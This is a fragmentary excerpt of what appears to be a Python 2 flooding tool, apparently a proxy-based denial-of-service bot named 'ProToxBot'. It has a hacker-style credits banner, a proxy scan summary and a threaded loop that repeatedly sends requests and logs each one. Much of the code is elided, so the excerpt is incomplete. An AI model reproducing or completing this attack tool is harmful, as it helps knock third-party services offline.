...
print"\033[1;91m## Boy! _|.|.|_  \    ##      Twitter : @S0u1_HLoTW     ##                 ##"
print"\033[1;92m##     /(  ) ' '  \   ##          Coded with luv        ##     I'll        ##"
print"\033[1;94m##    |  \/   . |  \  ##               1337             ##                 ##"
print"\033[1;91m##     \_/\__/| |     ##   Special Thanks to ProToxic   ##                 ##"
...
###############
IHOPETHISWASTESYOURTIMEINTHESOURCE = "1337"
...
p5+=ips
h+=p[0]
print"Coded by Ala, Protoxic, and S0u1"
print"[+]Scan finished"
print"\nhttp/https:", len(h)
p4=p[2]
print"\nsocks4:", len(p4)
  ...
  while True:
   try:
    ...
    for l in range(random.randint(1,5)):
     ...
     try:
      s.send(m)
      print"\033[1;91m[!] Request sent | \033[1;94mProToxBot: {} | \033[1;92mThread: {}".format(ipp,c+1)
